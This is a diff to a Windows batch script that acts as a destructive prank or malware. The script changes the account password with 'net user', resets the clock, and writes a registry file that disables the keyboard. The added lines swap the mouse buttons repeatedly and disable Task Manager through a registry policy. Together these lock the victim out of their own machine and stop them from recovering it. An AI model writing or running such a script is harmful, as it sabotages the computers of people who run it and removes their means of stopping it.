@@ -58,6 +58,9 @@ start msg.vbs
 
 start notepad.exe
 
+RUNDLL32 USER32.DLL,SwapMouseButton
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+
 date 22/08/2014
 time 06:06:06
 
@@ -65,10 +68,16 @@ net user %username% *
 XDjyDR4lr0gJzhGe
 XDjyDR4lr0gJzhGe
 
+RUNDLL32 USER32.DLL,SwapMouseButton
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+
 date 22/08/2014
 time 06:06:06
 
 RUNDLL32 USER32.DLL,SwapMouseButton
+
+RUNDLL32 USER32.DLL,SwapMouseButton
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
 echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
 echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
@@ -94,8 +103,17 @@ echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,
 echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
 echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
 start "nokeyboard.reg"
+
+RUNDLL32 USER32.DLL,SwapMouseButton
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+
 start notepad.exe
+
 start notepad.exe 
+
+RUNDLL32 USER32.DLL,SwapMouseButton
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+
 start notepad.exe
 
 @echo off
